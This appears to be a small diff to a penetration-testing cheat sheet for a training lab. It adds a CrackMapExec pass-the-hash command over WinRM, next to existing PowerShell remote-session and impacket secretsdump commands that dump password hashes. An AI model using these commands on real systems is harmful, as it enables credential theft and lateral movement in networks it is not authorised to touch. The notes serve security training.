@@ -196,6 +196,9 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName 172.16.191.10 -Credential $credential
 Enter-PSSession 1(id)
 ```
+```
+cme winrm ip -u celia.almeda -H ntlm_hash 
+```
 ###### Dump the local password hash and domain cached hash
 ```
 /usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
